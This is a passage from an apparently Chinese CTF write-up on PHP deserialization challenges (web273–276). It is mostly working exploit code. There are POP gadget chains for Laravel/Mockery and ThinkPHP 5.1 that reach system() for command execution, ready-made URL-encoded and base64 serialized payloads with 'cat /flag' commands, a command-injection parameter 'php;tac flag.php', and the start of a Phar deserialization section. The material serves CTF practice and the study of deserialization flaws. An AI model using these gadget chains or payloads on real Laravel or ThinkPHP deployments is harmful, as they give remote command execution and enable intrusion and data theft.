<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> Mockery\<span class="built_in">Generator</span>\MockDefinition(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">post</span>:</span><br><span class="line"><span class="attribute">data</span>=O%<span class="number">3</span>A<span class="number">40</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBroadcasting%<span class="number">5</span>CPendingBroadcast%<span class="number">22</span>%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>events%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">25</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CBus%<span class="number">5</span>CDispatcher%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">16</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>queueResolver%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">25</span>%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CLoader%<span class="number">5</span>CEvalLoader%<span class="number">22</span>%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Di%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>load%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A<span class="number">8</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>event%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">43</span>%<span class="number">3</span>A%<span class="number">22</span>Illuminate%<span class="number">5</span>CFoundation%<span class="number">5</span>CConsole%<span class="number">5</span>CQueuedCommand%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">10</span>%<span class="number">3</span>A%<span class="number">22</span>connection%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">32</span>%<span class="number">3</span>A%<span class="number">22</span>Mockery%<span class="number">5</span>CGenerator%<span class="number">5</span>CMockDefinition%<span class="number">22</span>%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">9</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>config%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">37</span>%<span class="number">3</span>A%<span class="number">22</span>PhpParser%<span class="number">5</span>CNode%<span class="number">5</span>CScalar%<span class="number">5</span>CMagicConst%<span class="number">5</span>CLine%<span class="number">22</span>%<span class="number">3</span>A<span class="number">0</span>%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">31</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span class="number">27</span>cat+%<span class="number">2</span>Ff%<span class="number">2</span>A%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>Bexit%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h3 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h3><p>thinkphp5.1</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323192025545.png" alt="image-20220323192025545"></p>
<p>查看源代码：<img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323192107948.png" alt="image-20220323192107948"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files[]=<span class="keyword">new</span> Pivot();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data=<span class="keyword">array</span>(</span><br><span class="line">              <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">new</span> Request()</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;append=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;feng&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">            <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// HTTPS代理标识</span></span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="comment">// IP代理获取标识</span></span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="comment">// URL伪静态后缀</span></span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>]=[<span class="keyword">$this</span>,<span class="string">&#x27;isAjax&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://365bd24e-76d0-47ad-<span class="number">82b3</span>-eb3beadfc934.challenge.ctf.<span class="built_in">show</span>/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo0OiJmZW5nIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo0OiJmZW5nIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br><span class="line"></span><br><span class="line">&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag  随便输入参数</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">传入：</span><br><span class="line"></span><br><span class="line">/?lin= cat%<span class="number">20</span>/fl*&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323192946548.png" alt="image-20220323192946548"></p>
<p>利用的地方在filter类的析构方法__destruct()中，会对传入的<code>fn</code>参数进行命令的拼接，而其之前有一个判断，要求<code>$this-&gt;evilfile=true</code>，那么就需要在filter类的checkevil()方法中有一条正则匹配成功，比如说第一条匹配成功。由此，payload如下：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="function"><span class="keyword">fn</span>=<span class="title">php</span>;<span class="title">tac</span> <span class="title">flag</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>

<p>或者：也可以第二条匹配成功，也就是<code>$content</code>中又flag，而<code>$content</code>来源于<code>$content = file_get_contents(&#39;php://input&#39;);</code>：</p>
<p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323200115394.png" alt="image-20220323200115394"></p>
<p>反序列化突破是__destruct()函数;</p>
<p>$_GET[‘fn’]给类中的filename赋值，而$content是input协议post传入的值赋值给filecontent</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br></pre></td></tr></table></figure>

<p>触发system的条件是类中的evilfile为TRUE，而checkevil方法有两个方式可以改变evilfile属性：1、filename也就是传入的fn含有php；2、filecontent也就是post的内容含有flag</p>
<p>注意，system是拼接的命令rm+filename，也就是get传入的fn，要想执行tac命令就必须用分号将rm分隔开 php;tac flag.php</p>
<p>方法二：post：flag   get:  ;tac flag.php</p>
<h3 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h3><p><img src="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220323203205269.png" alt="image-20220323203205269"></p>
<p>filter类里面多了个<code>$admin</code>，想要通过析构方法进行命令执行，则一定要使得<code>$admin=true</code>。而代码中并没有反序列化函数，所以可利用点在于<code>unlink()</code>函数(<code>file_get_contents()</code>函数也可以)。</p>
<p>Phar反序列化</p>
